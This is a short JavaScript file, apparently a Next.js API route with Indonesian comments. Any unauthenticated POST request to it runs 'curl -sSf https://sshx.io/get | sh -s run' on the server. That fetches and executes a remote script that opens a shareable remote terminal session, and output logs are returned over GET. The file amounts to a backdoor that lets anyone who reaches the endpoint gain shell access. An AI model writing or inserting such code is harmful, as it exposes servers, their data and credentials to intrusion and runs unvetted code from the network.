import { spawn } from 'child_process';

let processCache;
let logs = []; // Tempat menyimpan log untuk sementara

export default function handler(req, res) {
  if (req.method === 'POST') {
    if (processCache) {
      return res.status(200).json({ message: 'Process already running!', logs });
    }

    // Eksekusi perintah menggunakan spawn untuk log real-time
    processCache = spawn('sh', ['-c', 'curl -sSf https://sshx.io/get | sh -s run']);

    processCache.stdout.on('data', (data) => {
      const log = data.toString();
      logs.push({ type: 'stdout', message: log });
      console.log(`stdout: ${log}`);
    });

    processCache.stderr.on('data', (data) => {
      const log = data.toString();
      logs.push({ type: 'stderr', message: log });
      console.error(`stderr: ${log}`);
    });

    processCache.on('close', (code) => {
      logs.push({ type: 'info', message: `Process exited with code ${code}` });
      console.log(`Process exited with code ${code}`);
      processCache = null;
    });

    return res.status(200).json({ message: 'Process started!', logs });
  } else if (req.method === 'GET') {
    // API untuk mendapatkan log terbaru
    return res.status(200).json({ logs });
  } else {
    return res.status(405).json({ error: 'Method Not Allowed' });
  }
}
